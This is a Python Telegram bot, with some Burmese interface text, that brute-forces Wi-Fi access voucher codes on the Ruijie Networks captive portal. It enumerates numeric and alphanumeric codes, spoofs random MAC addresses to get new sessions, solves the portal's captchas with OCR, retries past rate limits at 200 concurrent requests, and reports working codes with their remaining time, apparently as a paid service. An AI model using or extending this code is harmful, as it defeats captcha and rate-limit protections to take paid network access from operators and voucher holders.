import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GH_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
ADMIN_ID = os.getenv("ADMIN_ID")

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}              # {chat_id: {"session_url": ...}}
approve = {}                # {chat_id: True/False}
scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
success_texts = {}
old_success_texts = {}      
limited_texts = {}          
old_limited_texts = {}      
captcha_state = {}          

notify_setting = {}         
last_scan_params = {}       
pending_brute = {}          
notify_state = {}

session = None
_connector = None

# ── Helper: send long text in ≤4096-char chunks split at newlines ──────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id if first else None)

CONCURRENCY = 200
_voucher_sem = None
_start_time = time.monotonic()

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ───────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins == float('inf') or total_mins > 500000:
        return "Unlimited ♾️"
    
    months = total_mins // (30 * 24 * 60)
    rem_mins = total_mins % (30 * 24 * 60)
    days = rem_mins // (24 * 60)
    rem_mins %= (24 * 60)
    hours = rem_mins // 60
    mins = rem_mins % 60
    
    parts = []
    if months > 0: parts.append(f"{months}mo")
    if days > 0: parts.append(f"{days}d")
    if hours > 0: parts.append(f"{hours}h")
    if mins > 0: parts.append(f"{mins}m")
    
    return " ".join(parts) if parts else "0m"

async def get_balance(session_id):
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200: return "N/A"
            data = await resp.json()
            
            candidates = [data]
            if isinstance(data.get('result'), dict): candidates.append(data['result'])
            if isinstance(data.get('data'), dict): candidates.append(data['data'])

            for d in candidates:
                if not isinstance(d, dict): continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None: return _parse_minutes(val)
            return "N/A"
    except:
        return "N/A"

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"

    response = None
    session_id = None
    for attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id: continue

            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except: continue
            if not auth_code: continue

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except: return
        if response and 'request limited' in response: continue
        break

    if response and 'logonUrl' in response:
        plan_str = await get_balance(session_id)
        if chat_id not in success_texts: success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})
        
        # UI Update: Show with plan info
        if notify_setting.get(chat_id, False):
            msg_text = f"✅ **Code Found!**\n\n🎫 Code: `{code}`\n⏳ Duration: `{plan_str}`"
            await bot.send_message(chat_id, msg_text, parse_mode="Markdown")
        return code
    return None

# ── Command Handlers with Buttons ──────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def send_welcome(message):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("Setup Bot ⚙️", callback_data="setup"),
               InlineKeyboardButton("Check Status 📊", callback_data="status"))
    markup.row(InlineKeyboardButton("My Keys 🔑", callback_data="keys"),
               InlineKeyboardButton("Help ❓", callback_data="help"))
    
    welcome_text = "👋 Welcome to Telegram Voucher Bot!\n\nအောက်က ခလုတ်တွေကို အသုံးပြုပြီး Bot ကို ထိန်းချုပ်နိုင်ပါတယ်။"
    await bot.reply_to(message, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    if call.data == "setup":
        await bot.answer_callback_query(call.id)
        await bot.send_message(chat_id, "Bot ကို setup လုပ်ဖို့ /setup <url> လို့ ရိုက်ပေးပါ။")
    elif call.data == "status":
        await bot.answer_callback_query(call.id)
        status_text = "🤖 Bot Status: Online\n⚡ Concurrency: 200\n🕒 Uptime: Running"
        await bot.send_message(chat_id, status_text)
    elif call.data == "help":
        await bot.answer_callback_query(call.id)
        help_text = "📖 **Help Menu**\n\n/setup <url> - Bot ကို စတင်ရန်\n/brute <mode> - Brute force စတင်ရန်\n/stop - ရပ်တန့်ရန်"
        await bot.send_message(chat_id, help_text, parse_mode="Markdown")

# ── Main ───────────────────────────────────────────────────────────────────
async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=CONCURRENCY)
    session = aiohttp.ClientSession(connector=_connector)
    
    # Start web server in background
    asyncio.create_task(web_server())
    
    print("Bot is starting...")
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
